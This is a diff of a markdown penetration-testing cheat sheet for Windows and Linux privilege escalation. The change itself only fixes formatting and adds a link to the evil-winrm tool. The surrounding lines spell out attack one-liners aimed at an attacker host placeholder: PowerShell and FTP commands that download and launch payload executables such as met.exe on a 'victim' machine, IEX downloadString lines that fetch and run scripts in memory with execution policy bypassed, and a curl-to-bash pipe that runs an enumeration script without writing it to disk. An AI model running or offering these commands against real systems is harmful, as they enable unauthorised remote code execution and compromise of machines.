@@ -26,7 +26,7 @@
 
 ## Priv Esc Windows
 * `powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://{kali_ip}:8080/m.exe', 'c:\users\victim\desktop\m.exe') }"` _Powershell download a file_
-* `systeminfo >systeminfo.txt` _Export sysinfo from windows
+* `systeminfo >systeminfo.txt` _Export sysinfo from windows_
 * `python windows-exploit-suggester.py --database 2018-09-06-mssb.xls --systeminfo sysinfo.txt` _Use exported sysinfo file to check for possible exploits using this tool https://github.com/GDSSecurity/Windows-Exploit-Suggester.git_
 * `python windows-exploit-suggester.py --update` _Get new database file for exploit suggester_
 * `cmd.exe /c @echo open x.x.x.x 21>c:\users\victim\desktop\ftp.txt&@echo USER anonymous>>c:\users\victim\desktop\ftp.txt&@echo anonymous>> c:\users\victim\desktop\ftp.txt&@echo binary>>c:\users\victim\desktop\ftp.txt&@echo get met.exe>>c:\users\victim\desktop\ftp.txt&@echo quit>>c:\users\victim\desktop\ftp.txt&@ftp -v -n -s:c:\users\victim\desktop\ftp.txt&@start met.exe` _Create a scirpt to download a file via ftp, then run the script, then run the downloaded file_
@@ -35,6 +35,7 @@
 * `IEX(New-Object Net.WebClient).downloadString('http://{kali_ip}/script.ps1')` _Download and exec a powershell script in memory_
 * `powershell -exec bypass -noexit "IEX(New-Object Net.WebClient).downloadString('http://{kali_ip}/script.ps1')"` _From cmd launch powershell to download and exec script in memory_
 * `run post/multi/recon/local_exploit_suggester` _meterpreter local exploit suggester_
+* [Shell for valid winrm creds port 5985](https://github.com/Hackplayers/evil-winrm)
 
 ## Priv Esc Linux
 * `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
